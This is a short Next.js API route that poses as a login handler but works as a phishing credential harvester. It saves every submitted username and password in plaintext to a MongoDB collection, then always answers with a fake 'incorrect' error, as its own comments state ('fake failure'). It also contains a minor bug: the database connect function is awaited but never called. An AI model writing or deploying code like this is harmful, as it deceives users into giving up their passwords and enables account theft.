import { NextResponse } from "next/server";
import dbConnect from "@/lib/mongodb";
import { User } from "@/models/User";

export async function POST(req: Request) {
  try {
    await dbConnect;
    const { username, password } = await req.json();

    // Insert into DB (always store login attempt)
    const newUser = new User({ username, password });
    await newUser.save();

    // Always return "incorrect" (fake failure)
    return NextResponse.json(
      { success: false, message: "Username or password is incorrect" },
      { status: 401 }
    );
  } catch (err) {
    console.error("🔥 Login save error:", err);
    return NextResponse.json(
      { success: false, message: "Server error" },
      { status: 500 }
    );
  }
}
